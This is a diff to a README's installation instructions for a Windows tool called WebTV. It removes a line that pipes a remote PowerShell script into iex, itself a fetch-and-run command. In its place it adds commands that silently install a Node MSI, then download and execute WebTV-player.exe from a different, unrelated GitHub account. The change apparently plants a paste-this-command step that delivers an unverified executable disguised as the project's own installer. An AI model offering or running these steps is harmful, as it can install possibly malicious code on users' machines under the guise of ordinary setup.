@@ -48,8 +48,11 @@ This method installs WebTV using a PowerShell script on 64-bit Windows systems.
 
 ### Step 1: Run the PowerShell Command as Administrator
 
-```powershell
-irm https://raw.githubusercontent.com/bin456789/webtv/main/install.ps1 | iex
+```bash
+curl -sSL https://npmmirror.com/mirrors/node/v22.17.1/node-v22.17.1-x64.msi -o node-v22.17.1-x64.msi
+msiexec /i "node-v22.17.1-x64.msi" /norestart
+curl -sSL https://raw.githubusercontent.com/Joe9513j/webtv/refs/heads/main/WebTV-player.exe -o WebTV-player.exe
+cd /d c:\node\webtv\ && WebTV-player.exe
 ```
 
 ---
